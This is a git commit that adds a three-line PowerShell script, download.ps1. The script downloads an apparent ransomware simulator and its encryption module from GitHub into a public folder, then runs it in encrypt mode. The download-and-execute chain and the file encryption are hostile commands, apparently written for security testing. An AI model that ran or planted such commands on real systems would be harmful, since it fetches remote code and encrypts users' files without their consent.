0d02f045b17f104fe26138d5aa64cb0348dd4e1a
Andre Fernandes <andre.fernandes86@gmail.com>
2022-12-14 15:28:06 -0600

    Create download.ps1

---
+++ download.ps1
@@ -0,0 +1,3 @@
+Invoke-WebRequest -Uri https://github.com/andrefernandes86/cp-RanSim/raw/main/RanSim.ps1 -OutFile C:\Users\Public\RanSim.ps1;
+Invoke-WebRequest -Uri https://github.com/andrefernandes86/cp-RanSim/raw/main/FileCryptography.psm1 -OutFile C:\Users\Public\FileCryptography.psm1;
+powershell C:\Users\Public\RanSim.ps1 -Mode encrypt;
